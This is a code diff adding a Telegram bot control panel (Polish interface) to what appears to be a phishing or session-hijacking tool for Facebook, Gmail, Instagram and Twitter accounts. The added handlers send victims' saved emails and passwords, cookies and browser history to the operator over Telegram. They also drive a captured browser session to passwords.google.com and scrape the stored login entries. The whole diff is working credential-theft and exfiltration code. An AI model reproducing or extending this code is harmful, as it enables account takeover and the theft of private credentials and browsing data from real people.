@@ -276,6 +276,212 @@ async function handleAddAccount(chatId, args, publicHost) {
   }
 }
 
+// ── /panel — inline keyboard main menu ───────────────────────────────────────
+
+async function sendInlineMessage(chatId, text, inline_keyboard) {
+  try {
+    await fetch(apiUrl('sendMessage'), {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        reply_markup: { inline_keyboard },
+        disable_web_page_preview: true,
+      }),
+    });
+  } catch { /* best-effort */ }
+}
+
+async function answerCallback(callbackQueryId, text) {
+  try {
+    await fetch(apiUrl('answerCallbackQuery'), {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
+    });
+  } catch { /* best-effort */ }
+}
+
+async function handlePanel(chatId, publicHost) {
+  try {
+    const { loadAccounts } = await import('./accounts.js');
+    const list = await loadAccounts();
+    if (list.length === 0) {
+      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
+      return;
+    }
+    const keyboard = list.map(acc => {
+      const icon = acc.email ? '🔑 ' : '';
+      return [{ text: `${icon}${acc.label}`, callback_data: `acc:${acc.id}` }];
+    });
+    keyboard.push([{ text: '➕ Dodaj konto', callback_data: 'help:addaccount' }]);
+    await sendInlineMessage(chatId, `📱 Konta (${list.length}):`, keyboard);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
+    await answerCallback(callbackQueryId);
+
+    const host = publicHost || config.publicHost;
+    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;
+
+    const lines = [`📋 *${acc.label}*`];
+    if (acc.email)    lines.push(`📧 ${acc.email}`);
+    if (acc.password) lines.push(`🔑 ${acc.password}`);
+
+    const keyboard = [
+      [
+        { text: '🔑 Hasła (plik)', callback_data: `pass:${accountId}` },
+        { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
+      ],
+      [
+        { text: '📋 Historia wyszukiwań', callback_data: `hist:${accountId}` },
+        { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
+      ],
+    ];
+    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
+    keyboard.push([{ text: '« Wróć', callback_data: 'panel' }]);
+
+    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handlePassFile(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Generuję plik...');
+  try {
+    const { loadAccounts } = await import('./accounts.js');
+    const list = await loadAccounts();
+    const withCreds = accountId === 'all'
+      ? list.filter(a => a.email || a.password)
+      : list.filter(a => a.id === accountId && (a.email || a.password));
+    if (withCreds.length === 0) {
+      await replyTo(chatId, '(brak zapisanych danych logowania)');
+      return;
+    }
+    const lines = [];
+    for (const acc of withCreds) {
+      lines.push(`=== ${acc.label} (${acc.id}) ===`);
+      if (acc.email)    lines.push(`Email:  ${acc.email}`);
+      if (acc.password) lines.push(`Hasło:  ${acc.password}`);
+      lines.push('');
+    }
+    const buf = Buffer.from(lines.join('\n'), 'utf8');
+    const fname = accountId === 'all' ? 'hasla-wszystkie.txt' : `hasla-${accountId}.txt`;
+    await sendDocument(buf, fname, `🔑 Dane logowania${accountId === 'all' ? '' : ': ' + withCreds[0]?.label}`);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleHistoryFile(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Pobieram historię...');
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const { getContext } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    const ctx = getContext(accountId);
+    if (!ctx) { await replyTo(chatId, `❌ Sesja "${accountId}" nie jest uruchomiona. Uruchom konto najpierw.`); return; }
+
+    // Pull history via CDP
+    const pages = ctx.pages();
+    if (!pages.length) { await replyTo(chatId, '❌ Brak otwartych stron'); return; }
+    const page = pages[0];
+    const cdp = await ctx.newCDPSession(page);
+    const result = await cdp.send('History.getEntries').catch(() => null);
+    await cdp.detach().catch(() => {});
+
+    if (!result?.entries?.length) {
+      await replyTo(chatId, '(brak historii lub historia niedostępna)');
+      return;
+    }
+    const lines = result.entries.map(e => `${e.title || '(bez tytułu)'}\n${e.url}`);
+    const buf = Buffer.from(lines.join('\n\n'), 'utf8');
+    await sendDocument(buf, `historia-${accountId}.txt`, `📋 Historia: ${acc.label}`);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Pobieram hasła z Google...');
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const { getContext } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    const ctx = getContext(accountId);
+    if (!ctx) { await replyTo(chatId, `❌ Sesja "${accountId}" nie jest uruchomiona.`); return; }
+
+    const pages = ctx.pages();
+    const page = pages[0];
+    const prevUrl = page.url();
+
+    await page.goto('https://passwords.google.com/list?pli=1', { waitUntil: 'domcontentloaded', timeout: 20000 });
+    await page.waitForTimeout(3000);
+
+    // Scroll to load all entries (lazy loading)
+    let prevHeight = 0;
+    for (let i = 0; i < 20; i++) {
+      const h = await page.evaluate(() => document.body.scrollHeight);
+      if (h === prevHeight) break;
+      prevHeight = h;
+      await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
+      await page.waitForTimeout(800);
+    }
+
+    // Extract all visible entries (site + username, password is masked)
+    const entries = await page.evaluate(() => {
+      const results = [];
+      // passwords.google.com uses aria-label and specific structure
+      const rows = document.querySelectorAll('[data-identifier], [jsname="toPmac"], li[jscontroller]');
+      rows.forEach(row => {
+        const texts = [...row.querySelectorAll('*')]
+          .filter(el => el.children.length === 0 && el.textContent.trim())
+          .map(el => el.textContent.trim())
+          .filter(t => t.length > 0 && t.length < 200);
+        if (texts.length >= 2) results.push(texts.slice(0, 3).join(' | '));
+      });
+      if (results.length) return results;
+
+      // Fallback: grab all text blocks that look like site/email pairs
+      const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;
+      const allText = document.body.innerText;
+      const lines = allText.split('\n').map(l => l.trim()).filter(Boolean);
+      const out = [];
+      for (let i = 0; i < lines.length - 1; i++) {
+        if (emailRe.test(lines[i + 1]) || emailRe.test(lines[i])) {
+          out.push(`${lines[i]} | ${lines[i + 1]}`);
+          i++;
+        }
+      }
+      return out;
+    }).catch(() => []);
+
+    // Navigate back
+    await page.goto(prevUrl, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
+
+    if (!entries.length) {
+      await replyTo(chatId, `❌ Brak haseł lub konto nie jest zalogowane w Google (${acc.label}).`);
+      return;
+    }
+
+    const buf = Buffer.from(entries.join('\n'), 'utf8');
+    await sendDocument(buf, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${entries.length} wpisów)`);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
 // ── Long-poll command listener ────────────────────────────────────────────────
 
 export function startCommandListener(publicHost) {
@@ -288,26 +494,60 @@ export function startCommandListener(publicHost) {
   async function poll() {
     while (running) {
       try {
-        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message"]`;
+        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query"]`;
         const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
         if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
         const data = await res.json();
         for (const upd of data.result || []) {
           offset = upd.update_id + 1;
+
+          // ── callback_query (inline keyboard button) ──
+          if (upd.callback_query) {
+            const cq = upd.callback_query;
+            const fromId = String(cq.from?.id || '');
+            if (adminId && fromId !== adminId) { await answerCallback(cq.id, '⛔ Brak dostępu'); continue; }
+            const chatId = cq.message?.chat?.id;
+            const d = cq.data || '';
+
+            if (d === 'panel') {
+              await handlePanel(chatId, publicHost);
+              await answerCallback(cq.id);
+            } else if (d.startsWith('acc:')) {
+              await handleAccountMenu(chatId, d.slice(4), cq.id, publicHost);
+            } else if (d.startsWith('pass:')) {
+              await handlePassFile(chatId, d.slice(5), cq.id);
+            } else if (d.startsWith('cook:')) {
+              await answerCallback(cq.id, '⏳ Pobieram cookies...');
+              await handleCookies(chatId, [d.slice(5)]);
+            } else if (d.startsWith('hist:')) {
+              await handleHistoryFile(chatId, d.slice(5), cq.id);
+            } else if (d.startsWith('gpas:')) {
+              await handleGooglePasswords(chatId, d.slice(5), cq.id);
+            } else if (d === 'help:addaccount') {
+              await answerCallback(cq.id);
+              await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
+            } else {
+              await answerCallback(cq.id);
+            }
+            continue;
+          }
+
+          // ── message / command ──
           const msg = upd.message;
           if (!msg?.text) continue;
           const fromId = String(msg.from?.id || '');
           const chatId = msg.chat?.id;
           if (adminId && fromId !== adminId) continue;
           const text = msg.text.trim();
-          // Parse command (strip bot username suffix if present)
           const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
           if (!cmdMatch) continue;
           const cmd = cmdMatch[1].toLowerCase();
           const rest = cmdMatch[2].trim();
           const parts = rest ? rest.split(/\s+/) : [];
 
-          if (cmd === '/adduser') {
+          if (cmd === '/panel' || cmd === '/start') {
+            await handlePanel(chatId, publicHost);
+          } else if (cmd === '/adduser') {
             await handlePanelAdduser(chatId, parts);
           } else if (cmd === '/users') {
             await handleUsers(chatId);
